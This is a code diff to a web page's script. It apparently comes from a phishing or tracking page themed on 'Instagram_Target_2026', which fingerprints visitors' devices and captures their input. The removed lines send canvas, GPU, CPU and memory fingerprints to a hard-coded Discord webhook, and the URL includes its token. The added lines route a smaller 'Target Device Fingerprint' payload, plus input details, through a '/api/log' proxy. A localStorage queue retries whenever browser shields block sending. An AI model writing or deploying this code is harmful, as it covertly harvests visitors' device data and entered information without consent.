@@ -95,43 +95,11 @@ footer .links a{color:var(--muted);font-weight:400}
 </footer>
 
 <script>
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1568460908886364362/pD_ue9r-hYvntxdg80KmtIZ6lQFHRQL_ke9_NkbAl2QJweaaIco1QKiCt5jcS0SrXBDK";
-
-// 1. Advanced Deep Hardware & Model Fingerprinting Engine
-function getCanvasFingerprint() {
-  try {
-    const canvas = document.createElement('canvas');
-    const ctx = canvas.getContext('2d');
-    ctx.textBaseline = "top";
-    ctx.font = "14px 'Arial'";
-    ctx.textBaseline = "alphabetic";
-    ctx.fillStyle = "#f60";
-    ctx.fillRect(125, 1, 62, 20);
-    ctx.fillStyle = "#069";
-    ctx.fillText("Instagram_Target_2026", 2, 15);
-    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-    ctx.fillText("Instagram_Target_2026", 4, 17);
-    return canvas.toDataURL().slice(-50);
-  } catch (e) {
-    return "Unavailable";
-  }
-}
-
-function getWebGLRenderer() {
-  try {
-    const canvas = document.createElement('canvas');
-    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-    if (!gl) return "No WebGL";
-    const ext = gl.getExtension('WEBGL_debug_renderer_info');
-    return ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : "WebGL Present";
-  } catch (e) {
-    return "Restricted";
-  }
-}
+// Point to your own Vercel serverless proxy endpoint instead of Discord directly
+const PROXY_URL = "/api/log";
 
 function parseExactDeviceModel(ua) {
   let modelName = "Unknown Mobile Device";
-
   if (/iPhone/i.test(ua)) modelName = "Apple iPhone";
   else if (/iPad/i.test(ua)) modelName = "Apple iPad";
   else {
@@ -163,7 +131,6 @@ function parseExactDeviceModel(ua) {
 async function getDeviceInfo() {
   const ua = navigator.userAgent;
   let os = "Unknown OS";
-
   if (/android/i.test(ua)) os = "Android";
   else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) os = "iOS";
   else if (/win/i.test(ua)) os = "Windows";
@@ -184,30 +151,22 @@ async function getDeviceInfo() {
     os: os,
     deviceModel: exactModel,
     screen: `${window.screen.width}x${window.screen.height}`,
-    cpuCores: navigator.hardwareConcurrency || "Unknown",
-    memory: navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "Unknown",
-    gpu: getWebGLRenderer(),
-    canvasHash: getCanvasFingerprint(),
     userAgent: ua
   };
 }
 
-// 2. Resilient Webhook Dispatcher with Local Storage Queuing
 async function sendNotification(actionType, extraData = {}) {
-  if (DISCORD_WEBHOOK_URL.includes("YOUR_DISCORD_WEBHOOK")) return;
   const info = await getDeviceInfo();
 
   const payload = {
-    content: `🔥 **Advanced Capture: ${actionType}**`,
+    content: `🔥 **Captured Alert: ${actionType}**`,
     embeds: [{
-      title: "Complete Target Fingerprint",
+      title: "Target Device Fingerprint",
       color: 15158332,
       fields: [
         { name: "Operating System", value: info.os, inline: true },
         { name: "Exact Model / Brand", value: info.deviceModel, inline: true },
         { name: "Screen Resolution", value: info.screen, inline: true },
-        { name: "CPU Cores / RAM", value: `${info.cpuCores} Cores / ${info.memory}`, inline: true },
-        { name: "GPU Renderer", value: info.gpu, inline: false },
         { name: "Input Details", value: JSON.stringify(extraData), inline: false },
         { name: "User Agent", value: info.userAgent, inline: false }
       ],
@@ -220,26 +179,25 @@ async function sendNotification(actionType, extraData = {}) {
 
 async function executeWebhook(payload) {
   try {
-    const response = await fetch(DISCORD_WEBHOOK_URL, {
+    const response = await fetch(PROXY_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     });
-    if (!response.ok) throw new Error('Blocked or Failed');
+    if (!response.ok) throw new Error('Proxy failed');
   } catch (err) {
-    // Save to local storage if blocked by shields or offline
-    let queue = JSON.parse(localStorage.getItem('advanced_queue') || '[]');
+    let queue = JSON.parse(localStorage.getItem('proxy_queue') || '[]');
     queue.push(payload);
-    localStorage.setItem('advanced_queue', JSON.stringify(queue));
+    localStorage.setItem('proxy_queue', JSON.stringify(queue));
   }
 }
 
 async function flushQueue() {
-  let queue = JSON.parse(localStorage.getItem('advanced_queue') || '[]');
+  let queue = JSON.parse(localStorage.getItem('proxy_queue') || '[]');
   if (queue.length > 0) {
     for (let payload of queue) {
       try {
-        await fetch(DISCORD_WEBHOOK_URL, {
+        await fetch(PROXY_URL, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
@@ -248,7 +206,7 @@ async function flushQueue() {
         return;
       }
     }
-    localStorage.removeItem('advanced_queue');
+    localStorage.removeItem('proxy_queue');
   }
 }
 
